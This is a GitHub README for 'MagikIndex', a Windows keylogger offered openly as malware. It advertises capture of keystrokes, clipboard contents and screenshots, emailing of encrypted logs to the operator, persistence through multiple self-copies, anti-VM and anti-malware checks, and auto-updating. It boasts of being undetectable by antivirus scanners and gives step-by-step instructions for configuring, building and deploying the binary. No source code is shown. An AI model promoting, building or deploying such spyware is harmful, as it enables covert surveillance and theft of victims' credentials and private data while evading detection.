#  ![indekkusu](https://user-images.githubusercontent.com/43145630/139555514-de439851-d18e-4ef4-832b-0845276687b0.png) </br> MagikIndex V2.2


<b><h3>🚧Work In Progress🚧</h3></b>

-----------------------------------------------------

A magical keylogger from a land far away...
Currently pretty advanced at over 2k lines of code.

-----------------------------------------------------------------------

<b> <h3> Features </h3> </b> </br>
<ul>
  <li><b> As of 18/07/2022 we are FUD on antiscan and have 2% detection rate on HA. 😎</b></li></br>
  <li>Retrieves logs to any email address. Even if an internet connection is absent at the time of logging.</li>
  <li>Even after it is deleted the logs will still persist and will be sent back anyways.</li>
  <li>Crypts all logs, only decryptable with the decrypter.</li>
  <li>Auto-updates using GitHub Raw or any other cloud service.</li>
  <li>Detects and logs context switches.(changes in the name of the focused window)</li>
  <li>Detects Ctrl+C and automatically retrieves the clipboard's contents.</li>
  <li>Offers an unencrypted and VM-friendly mode for debugging purposes.</li>
  <li>Files are Winzip compressed, with lz4 W.I.P.</li>
  <li>ScreenGrabbing is working, with ScreenShot-On-Click and Timer modes.</li>
  <li>Grabs lots of info(E.G. Hardware specs, System locale, Windows version, etc.) with more being added with each release.</li>
  <li>Pretty persistent: creates multiple copies of itself, so if one is deleted the other ones take its place.</li>
  <li>Has a system-wide evaluation and trust system that includes various kinds of VM/debugging/anti-malware checks(some are pretty unusual).</li>
  <li>Offers lots of easy customization with #defines at the start of the Common header.</li>
</ul>

-----------------------------------------------------------------------

<b> <h3> Detection </h3> </b>

Antiscan.me:</br>
![CFCGBMe1CSZH](https://user-images.githubusercontent.com/43145630/179535170-5fc26649-1613-4c1a-b5b2-36d8a3611d6d.png)

HybridAnalysis:
![Hares](https://user-images.githubusercontent.com/43145630/179535733-ae554147-ad36-4d32-a9cc-c34264fb8c62.PNG)



-----------------------------------------------------------------------

<b> <h3> How to use: </h3> </b>

<b> Step 1:</b></br>
Download the source code from this Git repository.

</br><b> Step 2:</b></br>
Setup 2FA and App Passwords on your "email sender" google account.

</br><b> Step 3:</b></br>
Create your HardEncode and HardDecode functions to crypt the authentication strings. (you will have to also re-encrypt several pre-encrypted strings)</br>
OR reverse the one i already wrote.</br>
Another possibility is to ditch Auth string encryption, be aware that this exposes strings to reverse engineering.

</br><b> Step 4:</b></br>
Edit the "common.h" header, customizing the behaviour of the keylogger and adding the encrypted authentication strings.

</br><b> Step 5:</b></br>
Add "masm" to the project build dependencies.</br>
Make sure that "random.asm" is <b>not</b> excluded from the build, also set its item type as Microsoft Macro Assembler.</br>
Set Project->Linker->System->Subsystem to "WINDOWS".</br>
Set Project->C/C++->Optimization->Whole Program Optimization to "No", Optimization to /Ox and Favor Size Or Speed to "Neither".</br>
Set Project->C/C++->Code Generation->Runtime Library to "/MT Multi-Threaded".</br>
Ensure that the project is set to Release x64.

</br><b> Step 6:</b></br>
Ctrl+shift+b to compile.

</br></br><b><h3>And here is your compiled, working, binary.</h3></b></br>

</br><b> Step 7(OPTIONAL):</b></br>
Set up a Github repo with your compiled binary to auto-update.

-----------------------------------------------------------------------

<b> <h3> Demos </h3> </b>

<b>Unfortunately a single log now takes up more than 4-5 screenshots, so i'll replace them with a link to two demo logs: a crypted and an unencrypted one.</b>

https://github.com/brat-volk/MagikIndex/raw/development/DemoLogs.zip </br></br>

-------------------------------------------------------------------------

Don't use my code for some shitty HackForums/RaidForums malware pasta, or at least credit me ;P</br></br>
<b>Be aware that i don't take any responsibility for the potential harm caused by this program.</b>
